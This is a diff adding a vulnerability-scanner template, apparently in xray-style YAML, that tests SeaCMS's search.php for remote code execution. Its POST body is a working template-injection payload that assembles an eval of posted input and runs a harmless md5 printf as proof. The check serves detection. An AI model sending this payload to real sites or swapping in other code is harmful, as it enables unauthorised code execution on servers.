@@ -1,0 +1,23 @@
+name: yaml-poc-seacms-seacms-rce-CT-530965
+binding: f1b993b6-e673-4d25-9f9b-99e5b68ef440
+detail:
+    author: system_user
+    links:
+        - https://www.jianshu.com/p/8d878330a42f
+    vulnerability:
+        id: 63ce6fe1-3465-4718-9376-cf4b4e4d0e53
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    rand: randomInt(2000000000, 2100000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /search.php
+            body: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5({{rand}}));
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+expression: r0()
